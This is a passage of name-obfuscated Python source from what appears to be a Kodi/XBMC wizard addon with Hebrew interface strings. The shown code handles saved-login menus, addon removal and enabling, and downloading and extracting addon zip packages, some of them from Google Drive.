	O0OOOO0O00OO0000O =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3004
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3005
	addFile ('Save Login Data: %s'%O0OOO0OOO0OO0O0OO ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3006
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O0OOOO0O00OO0000O ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3007
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3008
	for O0OOO0OOO0OO0O0OO in loginit .ORDER :#line:3010
		OOO0O0OO0O0000OOO =LOGINID [O0OOO0OOO0OO0O0OO ]['name']#line:3011
		OOO0O0O0OOO00000O =LOGINID [O0OOO0OOO0OO0O0OO ]['path']#line:3012
		O0O0O000OOO0OO000 =LOGINID [O0OOO0OOO0OO0O0OO ]['saved']#line:3013
		O0OO000OOO0OOOO00 =LOGINID [O0OOO0OOO0OO0O0OO ]['file']#line:3014
		O0OO0OOOOO00000O0 =wiz .getS (O0O0O000OOO0OO000 )#line:3015
		O0OOOOOO0OOO0OO0O =loginit .loginUser (O0OOO0OOO0OO0O0OO )#line:3016
		OOOOOOOOOOO0OOOOO =LOGINID [O0OOO0OOO0OO0O0OO ]['icon']if os .path .exists (OOO0O0O0OOO00000O )else ICONLOGIN #line:3017
		OOO000O0O0O0OOOO0 =LOGINID [O0OOO0OOO0OO0O0OO ]['fanart']if os .path .exists (OOO0O0O0OOO00000O )else FANART #line:3018
		OO0O00O0O0OOO0O0O =createMenu ('saveaddon','Login',O0OOO0OOO0OO0O0OO )#line:3019
		O0O0OOO00O0OO0OO0 =createMenu ('save','Login',O0OOO0OOO0OO0O0OO )#line:3020
		OO0O00O0O0OOO0O0O .append ((THEME2 %'%s Settings'%OOO0O0OO0O0000OOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O0OOO0OOO0OO0O0OO )))#line:3021
		addFile ('[+]-> %s'%OOO0O0OO0O0000OOO ,'',icon =OOOOOOOOOOO0OOOOO ,fanart =OOO000O0O0O0OOOO0 ,themeit =THEME3 )#line:3023
		if not os .path .exists (OOO0O0O0OOO00000O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOOOOOOOOO0OOOOO ,fanart =OOO000O0O0O0OOOO0 ,menu =OO0O00O0O0OOO0O0O )#line:3024
		elif not O0OOOOOO0OOO0OO0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O0OOO0OOO0OO0O0OO ,icon =OOOOOOOOOOO0OOOOO ,fanart =OOO000O0O0O0OOOO0 ,menu =OO0O00O0O0OOO0O0O )#line:3025
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0OOOOOO0OOO0OO0O ,'authlogin',O0OOO0OOO0OO0O0OO ,icon =OOOOOOOOOOO0OOOOO ,fanart =OOO000O0O0O0OOOO0 ,menu =OO0O00O0O0OOO0O0O )#line:3026
		if O0OO0OOOOO00000O0 =="":#line:3027
			if os .path .exists (O0OO000OOO0OOOO00 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O0OOO0OOO0OO0O0OO ,icon =OOOOOOOOOOO0OOOOO ,fanart =OOO000O0O0O0OOOO0 ,menu =O0O0OOO00O0OO0OO0 )#line:3028
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O0OOO0OOO0OO0O0OO ,icon =OOOOOOOOOOO0OOOOO ,fanart =OOO000O0O0O0OOOO0 ,menu =O0O0OOO00O0OO0OO0 )#line:3029
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OO0OOOOO00000O0 ,'',icon =OOOOOOOOOOO0OOOOO ,fanart =OOO000O0O0O0OOOO0 ,menu =O0O0OOO00O0OO0OO0 )#line:3030
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3032
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3033
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3034
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3035
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3036
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3037
	setView ('files','viewType')#line:3038
def fixUpdate ():#line:3040
	if KODIV <17 :#line:3041
		OOOO0O0O0O0OOOOO0 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3042
		try :#line:3043
			os .remove (OOOO0O0O0O0OOOOO0 )#line:3044
		except Exception as O0OO0O000OOO00OO0 :#line:3045
			wiz .log ("Unable to remove %s, Purging DB"%OOOO0O0O0O0OOOOO0 )#line:3046
			wiz .purgeDb (OOOO0O0O0O0OOOOO0 )#line:3047
	else :#line:3048
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3049
def removeAddonMenu ():#line:3051
	O000OO0O0O0O0000O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3052
	O00OOOO0OO00O0O00 =[];OO0OO00O0OO00OOOO =[]#line:3053
	for O0000000O0O0OO000 in sorted (O000OO0O0O0O0000O ,key =lambda O0OO0000OO00O0OOO :O0OO0000OO00O0OOO ):#line:3054
		O0OO000O00OOO0OOO =os .path .split (O0000000O0O0OO000 [:-1 ])[1 ]#line:3055
		if O0OO000O00OOO0OOO in EXCLUDES :continue #line:3056
		elif O0OO000O00OOO0OOO in DEFAULTPLUGINS :continue #line:3057
		elif O0OO000O00OOO0OOO =='packages':continue #line:3058
		OOOO000O0O00O0000 =os .path .join (O0000000O0O0OO000 ,'addon.xml')#line:3059
		if os .path .exists (OOOO000O0O00O0000 ):#line:3060
			OOO0OOOO0O00OO0OO =open (OOOO000O0O00O0000 )#line:3061
			OO000OO0O0O00O000 =OOO0OOOO0O00OO0OO .read ()#line:3062
			OO0O000OO0O0OOOO0 =wiz .parseDOM (OO000OO0O0O00O000 ,'addon',ret ='id')#line:3063
			OOOOO0OO00O0O0O00 =O0OO000O00OOO0OOO if len (OO0O000OO0O0OOOO0 )==0 else OO0O000OO0O0OOOO0 [0 ]#line:3065
			try :#line:3066
				OOOOOO0O0O000O000 =xbmcaddon .Addon (id =OOOOO0OO00O0O0O00 )#line:3067
				O00OOOO0OO00O0O00 .append (OOOOOO0O0O000O000 .getAddonInfo ('name'))#line:3068
				OO0OO00O0OO00OOOO .append (OOOOO0OO00O0O0O00 )#line:3069
			except :#line:3070
				pass #line:3071
	if len (O00OOOO0OO00O0O00 )==0 :#line:3072
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3073
		return #line:3074
	if KODIV >16 :#line:3075
		O0O00OOO00O0O0O0O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O00OOOO0OO00O0O00 )#line:3076
	else :#line:3077
		O0O00OOO00O0O0O0O =[];OOO0O0OOOOOO0O0OO =0 #line:3078
		OOOO0O0OOO0O00OO0 =["-- Click here to Continue --"]+O00OOOO0OO00O0O00 #line:3079
		while not OOO0O0OOOOOO0O0OO ==-1 :#line:3080
			OOO0O0OOOOOO0O0OO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOOO0O0OOO0O00OO0 )#line:3081
			if OOO0O0OOOOOO0O0OO ==-1 :break #line:3082
			elif OOO0O0OOOOOO0O0OO ==0 :break #line:3083
			else :#line:3084
				OO0OOO0O0OO0O0O00 =(OOO0O0OOOOOO0O0OO -1 )#line:3085
				if OO0OOO0O0OO0O0O00 in O0O00OOO00O0O0O0O :#line:3086
					O0O00OOO00O0O0O0O .remove (OO0OOO0O0OO0O0O00 )#line:3087
					OOOO0O0OOO0O00OO0 [OOO0O0OOOOOO0O0OO ]=O00OOOO0OO00O0O00 [OO0OOO0O0OO0O0O00 ]#line:3088
				else :#line:3089
					O0O00OOO00O0O0O0O .append (OO0OOO0O0OO0O0O00 )#line:3090
					OOOO0O0OOO0O00OO0 [OOO0O0OOOOOO0O0OO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O00OOOO0OO00O0O00 [OO0OOO0O0OO0O0O00 ])#line:3091
	if O0O00OOO00O0O0O0O ==None :return #line:3092
	if len (O0O00OOO00O0O0O0O )>0 :#line:3093
		wiz .addonUpdates ('set')#line:3094
		for OO0000OO0OOOO0OO0 in O0O00OOO00O0O0O0O :#line:3095
			removeAddon (OO0OO00O0OO00OOOO [OO0000OO0OOOO0OO0 ],O00OOOO0OO00O0O00 [OO0000OO0OOOO0OO0 ],True )#line:3096
		xbmc .sleep (1000 )#line:3098
		if INSTALLMETHOD ==1 :OOOOO0O00O0O00OOO =1 #line:3100
		elif INSTALLMETHOD ==2 :OOOOO0O00O0O00OOO =0 #line:3101
		else :OOOOO0O00O0O00OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3102
		if OOOOO0O00O0O00OOO ==1 :wiz .reloadFix ('remove addon')#line:3103
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3104
def removeAddonDataMenu ():#line:3106
	if os .path .exists (ADDOND ):#line:3107
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3108
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3109
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3110
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3111
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3112
		OO0O00O0O0O000OO0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3113
		for O0O0O0O00OOOO0OO0 in sorted (OO0O00O0O0O000OO0 ,key =lambda O00OOO0O0O00OOO00 :O00OOO0O0O00OOO00 ):#line:3114
			OO0O00O0OOO0O0OO0 =O0O0O0O00OOOO0OO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3115
			OO0OO00O0OO00O0O0 =os .path .join (O0O0O0O00OOOO0OO0 .replace (ADDOND ,ADDONS ),'icon.png')#line:3116
			O0000OO00O0O0O0O0 =os .path .join (O0O0O0O00OOOO0OO0 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3117
			O0O00O0O00O000000 =OO0O00O0OOO0O0OO0 #line:3118
			OOOOOO0O0000O0OO0 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3119
			for O00OO00OOOO0O0000 in OOOOOO0O0000O0OO0 :#line:3120
				O0O00O0O00O000000 =O0O00O0O00O000000 .replace (O00OO00OOOO0O0000 ,OOOOOO0O0000O0OO0 [O00OO00OOOO0O0000 ])#line:3121
			if OO0O00O0OOO0O0OO0 in EXCLUDES :O0O00O0O00O000000 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0O00O0O00O000000 #line:3122
			else :O0O00O0O00O000000 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0O00O0O00O000000 #line:3123
			addFile (' %s'%O0O00O0O00O000000 ,'removedata',OO0O00O0OOO0O0OO0 ,icon =OO0OO00O0OO00O0O0 ,fanart =O0000OO00O0O0O0O0 ,themeit =THEME2 )#line:3124
	else :#line:3125
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3126
	setView ('files','viewType')#line:3127
def enableAddons ():#line:3129
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3130
	OOO0OO00O0000OOO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3131
	O0O0OO0O0O0000O00 =0 #line:3132
	for O0OO00OOOO0O0OO0O in sorted (OOO0OO00O0000OOO0 ,key =lambda OO000OO00OOOO0O0O :OO000OO00OOOO0O0O ):#line:3133
		O0OOO0O0O0O000O00 =os .path .split (O0OO00OOOO0O0OO0O [:-1 ])[1 ]#line:3134
		if O0OOO0O0O0O000O00 in EXCLUDES :continue #line:3135
		if O0OOO0O0O0O000O00 in DEFAULTPLUGINS :continue #line:3136
		OOO000O0OO000O0OO =os .path .join (O0OO00OOOO0O0OO0O ,'addon.xml')#line:3137
		if os .path .exists (OOO000O0OO000O0OO ):#line:3138
			O0O0OO0O0O0000O00 +=1 #line:3139
			OOO0OO00O0000OOO0 =O0OO00OOOO0O0OO0O .replace (ADDONS ,'')[1 :-1 ]#line:3140
			OO0OOO000O0O00OO0 =open (OOO000O0OO000O0OO )#line:3141
			OOOOOO0O0000OOOO0 =OO0OOO000O0O00OO0 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3142
			OOO00OO000OO00O00 =wiz .parseDOM (OOOOOO0O0000OOOO0 ,'addon',ret ='id')#line:3143
			OOO00O00O0O00OO00 =wiz .parseDOM (OOOOOO0O0000OOOO0 ,'addon',ret ='name')#line:3144
			try :#line:3145
				O0OOO0000OO00OO00 =OOO00OO000OO00O00 [0 ]#line:3146
				O0OO0000O0OO00OOO =OOO00O00O0O00OO00 [0 ]#line:3147
			except :#line:3148
				continue #line:3149
			try :#line:3150
				O0O00O0O0OOO00000 =xbmcaddon .Addon (id =O0OOO0000OO00OO00 )#line:3151
				OOO0000O00OO0OO0O ="[COLOR green][Enabled][/COLOR]"#line:3152
				O0OO00O0OOOOO0000 ="false"#line:3153
			except :#line:3154
				OOO0000O00OO0OO0O ="[COLOR red][Disabled][/COLOR]"#line:3155
				O0OO00O0OOOOO0000 ="true"#line:3156
				pass #line:3157
			OOO0000OO00OO00OO =os .path .join (O0OO00OOOO0O0OO0O ,'icon.png')if os .path .exists (os .path .join (O0OO00OOOO0O0OO0O ,'icon.png'))else ICON #line:3158
			OOOOO00OOO000OOOO =os .path .join (O0OO00OOOO0O0OO0O ,'fanart.jpg')if os .path .exists (os .path .join (O0OO00OOOO0O0OO0O ,'fanart.jpg'))else FANART #line:3159
			addFile ("%s %s"%(OOO0000O00OO0OO0O ,O0OO0000O0OO00OOO ),'toggleaddon',OOO0OO00O0000OOO0 ,O0OO00O0OOOOO0000 ,icon =OOO0000OO00OO00OO ,fanart =OOOOO00OOO000OOOO )#line:3160
			OO0OOO000O0O00OO0 .close ()#line:3161
	if O0O0OO0O0O0000O00 ==0 :#line:3162
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3163
	setView ('files','viewType')#line:3164
def changeFeq ():#line:3166
	OOO00OOOOOO0O0OOO =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3167
	OO0O0OOOO0OO00O00 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OOO00OOOOOO0O0OOO )#line:3168
	if not OO0O0OOOO0OO00O00 ==-1 :#line:3169
		wiz .setS ('autocleanfeq',str (OO0O0OOOO0OO00O00 ))#line:3170
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OOO00OOOOOO0O0OOO [OO0O0OOOO0OO00O00 ]))#line:3171
def developer ():#line:3173
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3174
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3175
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3176
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3177
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3178
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3179
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3180
	setView ('files','viewType')#line:3182
def download (O00O00OOO0000O0OO ,OO0O0OO00OOO000OO ):#line:3187
  O00OOO00O0OO00OOO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3188
  O0O0000OO000O000O =xbmcgui .DialogProgress ()#line:3189
  O0O0000OO000O000O .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3190
  O00OO0O00000OOOO0 =os .path .join (O00OOO00O0OO00OOO ,'isr.zip')#line:3191
  OO0OO0O00000OOOO0 =urllib2 .Request (O00O00OOO0000O0OO )#line:3192
  O0000O000000O000O =urllib2 .urlopen (OO0OO0O00000OOOO0 )#line:3193
  OOO000O00OO0O0000 =xbmcgui .DialogProgress ()#line:3195
  OOO000O00OO0O0000 .create ("Downloading","Downloading "+name )#line:3196
  OOO000O00OO0O0000 .update (0 )#line:3197
  OOOO00OOOO0O00O00 =OO0O0OO00OOO000OO #line:3198
  O00O0000OOO0OOO00 =open (O00OO0O00000OOOO0 ,'wb')#line:3199
  try :#line:3201
    OO00OO0O00OOOOO0O =O0000O000000O000O .info ().getheader ('Content-Length').strip ()#line:3202
    O0000O0O0O000O0O0 =True #line:3203
  except AttributeError :#line:3204
        O0000O0O0O000O0O0 =False #line:3205
  if O0000O0O0O000O0O0 :#line:3207
        OO00OO0O00OOOOO0O =int (OO00OO0O00OOOOO0O )#line:3208
  OO00O0O000OO0OOO0 =0 #line:3210
  O0O000O0O0O000O00 =time .time ()#line:3211
  while True :#line:3212
        O00OOO0OOO000O0O0 =O0000O000000O000O .read (8192 )#line:3213
        if not O00OOO0OOO000O0O0 :#line:3214
            sys .stdout .write ('\n')#line:3215
            break #line:3216
        OO00O0O000OO0OOO0 +=len (O00OOO0OOO000O0O0 )#line:3218
        O00O0000OOO0OOO00 .write (O00OOO0OOO000O0O0 )#line:3219
        if not O0000O0O0O000O0O0 :#line:3221
            OO00OO0O00OOOOO0O =OO00O0O000OO0OOO0 #line:3222
        if OOO000O00OO0O0000 .iscanceled ():#line:3223
           OOO000O00OO0O0000 .close ()#line:3224
           try :#line:3225
            os .remove (O00OO0O00000OOOO0 )#line:3226
           except :#line:3227
            pass #line:3228
           break #line:3229
        OOO0O00O0000OOO0O =float (OO00O0O000OO0OOO0 )/OO00OO0O00OOOOO0O #line:3230
        OOO0O00O0000OOO0O =round (OOO0O00O0000OOO0O *100 ,2 )#line:3231
        OO000OO0O0OO0O0OO =OO00O0O000OO0OOO0 /(1024 *1024 )#line:3232
        O0O00OO0O0O0OOO0O =OO00OO0O00OOOOO0O /(1024 *1024 )#line:3233
        O000O0OO0000O00OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO000OO0O0OO0O0OO ,'teal',O0O00OO0O0O0OOO0O )#line:3234
        if (time .time ()-O0O000O0O0O000O00 )>0 :#line:3235
          OOO0OOOO0O000000O =OO00O0O000OO0OOO0 /(time .time ()-O0O000O0O0O000O00 )#line:3236
          OOO0OOOO0O000000O =OOO0OOOO0O000000O /1024 #line:3237
        else :#line:3238
         OOO0OOOO0O000000O =0 #line:3239
        O0O00O000O0OOO0OO ='KB'#line:3240
        if OOO0OOOO0O000000O >=1024 :#line:3241
           OOO0OOOO0O000000O =OOO0OOOO0O000000O /1024 #line:3242
           O0O00O000O0OOO0OO ='MB'#line:3243
        if OOO0OOOO0O000000O >0 and not OOO0O00O0000OOO0O ==100 :#line:3244
            O0O0OO000O0O00O0O =(OO00OO0O00OOOOO0O -OO00O0O000OO0OOO0 )/OOO0OOOO0O000000O #line:3245
        else :#line:3246
            O0O0OO000O0O00O0O =0 #line:3247
        O00O000O00OOO0O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0OOOO0O000000O ,O0O00O000O0OOO0OO )#line:3248
        OOO000O00OO0O0000 .update (int (OOO0O00O0000OOO0O ),"Downloading "+name ,O000O0OO0000O00OO ,O00O000O00OOO0O0O )#line:3250
  OO000OO0O0OOOOOO0 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3253
  O00O0000OOO0OOO00 .close ()#line:3255
  extract (O00OO0O00000OOOO0 ,OO000OO0O0OOOOOO0 ,OOO000O00OO0O0000 )#line:3257
  if os .path .exists (OO000OO0O0OOOOOO0 +'/scakemyer-script.quasar.burst'):#line:3258
    if os .path .exists (OO000OO0O0OOOOOO0 +'/script.quasar.burst'):#line:3259
     shutil .rmtree (OO000OO0O0OOOOOO0 +'/script.quasar.burst',ignore_errors =False )#line:3260
    os .rename (OO000OO0O0OOOOOO0 +'/scakemyer-script.quasar.burst',OO000OO0O0OOOOOO0 +'/script.quasar.burst')#line:3261
  if os .path .exists (OO000OO0O0OOOOOO0 +'/plugin.video.kmediatorrent-master'):#line:3263
    if os .path .exists (OO000OO0O0OOOOOO0 +'/plugin.video.kmediatorrent'):#line:3264
     shutil .rmtree (OO000OO0O0OOOOOO0 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3265
    os .rename (OO000OO0O0OOOOOO0 +'/plugin.video.kmediatorrent-master',OO000OO0O0OOOOOO0 +'/plugin.video.kmediatorrent')#line:3266
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3267
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3268
  try :#line:3269
    os .remove (O00OO0O00000OOOO0 )#line:3270
  except :#line:3271
    pass #line:3272
  OOO000O00OO0O0000 .close ()#line:3273
def dis_or_enable_addon (O00000O0O0OO0OO0O ,O00OOOOOOOOO0O00O ,enable ="true"):#line:3274
    import json #line:3275
    O000OOOOOOOOOO000 ='"%s"'%O00000O0O0OO0OO0O #line:3276
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O00000O0O0OO0OO0O )and enable =="true":#line:3277
        logging .warning ('already Enabled')#line:3278
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O00000O0O0OO0OO0O )#line:3279
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O00000O0O0OO0OO0O )and enable =="false":#line:3280
        return xbmc .log ("### Skipped %s, reason = not installed"%O00000O0O0OO0OO0O )#line:3281
    else :#line:3282
        O0O00O00O00O0000O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O000OOOOOOOOOO000 ,enable )#line:3283
        O0OOOOO000O00O000 =xbmc .executeJSONRPC (O0O00O00O00O0000O )#line:3284
        OOOOO0O00O000O0OO =json .loads (O0OOOOO000O00O000 )#line:3285
        if enable =="true":#line:3286
            xbmc .log ("### Enabled %s, response = %s"%(O00000O0O0OO0OO0O ,OOOOO0O00O000O0OO ))#line:3287
        else :#line:3288
            xbmc .log ("### Disabled %s, response = %s"%(O00000O0O0OO0OO0O ,OOOOO0O00O000O0OO ))#line:3289
    if O00OOOOOOOOO0O00O =='auto':#line:3290
     return True #line:3291
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3292
def chunk_report (O00O0OO0O0OO0O0O0 ,OOO000O0O00OO00OO ,O00OOO00OOO00OOOO ):#line:3293
   OO00O0OO000OO000O =float (O00O0OO0O0OO0O0O0 )/O00OOO00OOO00OOOO #line:3294
   OO00O0OO000OO000O =round (OO00O0OO000OO000O *100 ,2 )#line:3295
   if O00O0OO0O0OO0O0O0 >=O00OOO00OOO00OOOO :#line:3297
      sys .stdout .write ('\n')#line:3298
def chunk_read (OOOOO0OOOO000OOO0 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3300
   import time #line:3301
   OOO0OOO00OO00OO00 =int (filesize )*1000000 #line:3302
   O0O0OO0OO0O0OO000 =0 #line:3304
   OOOOO0OO0OO0000O0 =time .time ()#line:3305
   O0O0O000OO0000OOO =0 #line:3306
   logging .warning ('Downloading')#line:3308
   with open (destination ,"wb")as O000OOOO00OO0O00O :#line:3309
    while 1 :#line:3310
      OO0OOOOOOOO000OO0 =time .time ()-OOOOO0OO0OO0000O0 #line:3311
      O0OO0OOO0O0O000O0 =int (O0O0O000OO0000OOO *chunk_size )#line:3312
      O000000OOOOOOO000 =OOOOO0OOOO000OOO0 .read (chunk_size )#line:3313
      O000OOOO00OO0O00O .write (O000000OOOOOOO000 )#line:3314
      O000OOOO00OO0O00O .flush ()#line:3315
      O0O0OO0OO0O0OO000 +=len (O000000OOOOOOO000 )#line:3316
      OO0O00OO0000OOOO0 =float (O0O0OO0OO0O0OO000 )/OOO0OOO00OO00OO00 #line:3317
      OO0O00OO0000OOOO0 =round (OO0O00OO0000OOOO0 *100 ,2 )#line:3318
      if int (OO0OOOOOOOO000OO0 )>0 :#line:3319
        OOO0OO0O0OO0OOOO0 =int (O0OO0OOO0O0O000O0 /(1024 *OO0OOOOOOOO000OO0 ))#line:3320
      else :#line:3321
         OOO0OO0O0OO0OOOO0 =0 #line:3322
      if OOO0OO0O0OO0OOOO0 >1024 and not OO0O00OO0000OOOO0 ==100 :#line:3323
          OOOO0OO0OOO000O0O =int (((OOO0OOO00OO00OO00 -O0OO0OOO0O0O000O0 )/1024 )/(OOO0OO0O0OO0OOOO0 ))#line:3324
      else :#line:3325
          OOOO0OO0OOO000O0O =0 #line:3326
      if OOOO0OO0OOO000O0O <0 :#line:3327
        OOOO0OO0OOO000O0O =0 #line:3328
      dp .update (int (OO0O00OO0000OOOO0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO0O00OO0000OOOO0 ,O0OO0OOO0O0O000O0 /(1024 *1024 ),OOO0OOO00OO00OO00 /(1000 *1000 ),OOO0OO0O0OO0OOOO0 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOOO0OO0OOO000O0O ,60 ))#line:3329
      if dp .iscanceled ():#line:3330
         dp .close ()#line:3331
         break #line:3332
      if not O000000OOOOOOO000 :#line:3333
         break #line:3334
      if report_hook :#line:3336
         report_hook (O0O0OO0OO0O0OO000 ,chunk_size ,OOO0OOO00OO00OO00 )#line:3337
      O0O0O000OO0000OOO +=1 #line:3338
   logging .warning ('END Downloading')#line:3339
   return O0O0OO0OO0O0OO000 #line:3340
def googledrive_download (OO0OOO00OOO0O000O ,O0OOOO0OO0O0OO0O0 ,O0O00OOOO0O0O000O ,OO00O0O0O0O0O00OO ):#line:3342
    O000OO00OO0000O00 =[]#line:3346
    O0OO000OO0O0O0O00 =OO0OOO00OOO0O000O .split ('=')#line:3347
    OO0OOO00OOO0O000O =O0OO000OO0O0O0O00 [len (O0OO000OO0O0O0O00 )-1 ]#line:3348
    def O00OOOO00O0O00O00 (OOOO00O0OO00O00O0 ):#line:3350
        for O0000O0O00O0O000O in OOOO00O0OO00O00O0 :#line:3352
            logging .warning ('cookie.name')#line:3353
            logging .warning (O0000O0O00O0O000O .name )#line:3354
            O00000O0OO0O0OOOO =O0000O0O00O0O000O .value #line:3355
            if 'download_warning'in O0000O0O00O0O000O .name :#line:3356
                logging .warning (O0000O0O00O0O000O .value )#line:3357
                logging .warning ('cookie.value')#line:3358
                return O0000O0O00O0O000O .value #line:3359
            return O00000O0OO0O0OOOO #line:3360
        return None #line:3362
    def O000OO0O0O00O0OO0 (O00O0OO000OO0OOOO ,OO0O0OO0OO00O0OOO ):#line:3364
        O000O0OO0O0OO000O =32768 #line:3366
        OO00O0O00O000O0OO =time .time ()#line:3367
        with open (OO0O0OO0OO00O0OOO ,"wb")as O000OO00O00000O0O :#line:3369
            O0OOO000OOO00OOOO =1 #line:3370
            OOOO0OO0000O00O00 =32768 #line:3371
            try :#line:3372
                O0000000O0OO00O00 =int (O00O0OO000OO0OOOO .headers .get ('content-length'))#line:3373
                print ('file total size :',O0000000O0OO00O00 )#line:3374
            except TypeError :#line:3375
                print ('using dummy length !!!')#line:3376
                O0000000O0OO00O00 =int (OO00O0O0O0O0O00OO )*1000000 #line:3377
            for O00O00O00O0OOOOO0 in O00O0OO000OO0OOOO .iter_content (O000O0OO0O0OO000O ):#line:3378
                if O00O00O00O0OOOOO0 :#line:3379
                    O000OO00O00000O0O .write (O00O00O00O0OOOOO0 )#line:3380
                    O000OO00O00000O0O .flush ()#line:3381
                    O0OO0OO0O0000OO00 =time .time ()-OO00O0O00O000O0OO #line:3382
                    OO000O000OOO0OO0O =int (O0OOO000OOO00OOOO *OOOO0OO0000O00O00 )#line:3383
                    if O0OO0OO0O0000OO00 ==0 :#line:3384
                        O0OO0OO0O0000OO00 =0.1 #line:3385
                    OOO0O00O00O0O0OO0 =int (OO000O000OOO0OO0O /(1024 *O0OO0OO0O0000OO00 ))#line:3386
